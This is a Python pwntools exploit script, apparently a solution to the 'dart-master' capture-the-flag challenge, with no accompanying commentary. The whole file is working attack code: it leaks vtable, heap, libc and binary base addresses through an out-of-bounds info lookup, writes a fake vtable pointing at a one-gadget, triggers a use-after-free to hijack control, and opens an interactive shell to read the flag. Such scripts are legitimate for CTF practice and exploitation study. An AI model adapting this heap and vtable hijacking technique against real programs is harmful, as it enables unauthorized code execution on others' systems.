from pwn import *

s = process('./dart-master')
e = ELF('./dart-master')

def Generate(ID, password, information, init='1'):
   if init == '1':
      s.sendline('2')
   s.recvuntil('Enter your ID : ')
   s.sendline(ID)
   s.recvuntil('Enter password : ')
   s.sendline(password)
   s.recvuntil('Confirm password : ')
   s.sendline(password)
   s.recvuntil('Enter information : ')
   s.sendline(information)
   s.recvuntil('> ')

def Login(ID, password):
   s.sendline('1')
   s.recvuntil('Enter your ID : ')
   s.sendline(ID)
   s.recvuntil('Enter password : ')
   s.sendline(password)
   s.recvuntil('> ')

def Delete(ID, password):
   s.sendline('3')
   s.recvuntil('Which ID do you wanna delete? ')
   s.sendline(ID)
   s.recvuntil('Please enter password : ')
   s.sendline(password)
   s.recvuntil('> ')

def Practice():
   hit = 0
   s.sendline('1')
   s.recv()
   for i in range(10):
      s.sendline('1')
      s.recv()
      s.sendline('1')
      s.recv()
      s.sendline('1')
      s.recv()

def Win():
   hit = 0
   s.sendline('2')
   s.recv()
   while(1):
      s.sendline('50')
      result = s.recv()
      if 'Hit' in result:
         hit += 1
         result
      if hit == 10:
         s.sendline('1')
         result = s.recv()
         result
         if 'Game Over!' in result:
            Win()
         break
      if 'Game Over!' in result:
         Win()
      elif '>' in result:
         break

def change_password(password):
   s.sendline('3')
   s.recvuntil('> ')
   s.sendline('1')
   s.recvuntil('Enter new password : ')
   s.sendline(password)
   s.recvuntil('> ')
   s.sendline('5')
   s.recvuntil('> ')

def see_my_info():
   s.sendline('3')
   s.recvuntil('> ')
   s.sendline('2')
   s.recvuntil('Number of victories : ')
   win_count = s.recv(1)
   s.recvuntil('> ')
   s.sendline('5')
   s.recvuntil('>')
   if win_count == '0':
      Win()
      see_my_info

def see_other_info(index, choice, till):
   leak = 0
   s.sendline('3')
   s.recvuntil('> ')
   s.sendline('3')
   s.recvuntil('Which one do you wanna see? ')
   s.sendline(index)
   s.recvuntil('> ')
   s.sendline(choice) # card_ID, ID, Information, No of Victories
   s.recvuntil(till)
   if till == '0x':
      leak = int(s.recv(12), 16)
   else:
      leak = u64(s.recv(6)+'\x00'*2)
   s.recvuntil('> ')
   s.sendline('5')
   s.recvuntil('> ')
   return leak

def Logout():
   s.sendline('3')
   s.recvuntil('> ')
   s.sendline('4')
   s.recvuntil('> ')

def fake_allocate(data):
   s.sendline('3')
   s.recvuntil('Which ID do you wanna delete? ')
   s.sendline(data)
   s.recvuntil('> ')

Generate('1', '1', '1', '0')
Generate('2', '2', '2')
Generate('3', '3', '3')

Delete('3', '3')

Login('1', '1')
Practice()
Win()

vtable_leak = see_other_info('6', '1', '0x') - 0x10

user_leak = see_other_info('0', '1', '0x')
fake_vtable = user_leak + 240

arena_leak = see_other_info('632', '1', '0x')
libc_leak = arena_leak - 0x3c4b78

base_leak = see_other_info('618', '1', '0x') - 0x204c88

system = libc_leak + 0x45390
oneshot = libc_leak + 0x4526a

change_password(p64(base_leak + 0x3877) + p64(0) + p64(base_leak + 0x384c) + p64(oneshot))

Logout()
Delete('2', '2')

fake_allocate(p64(fake_vtable)+p64(0)*6)
s.sendline("2")

s.sendline('cat flag')
s.interactive()
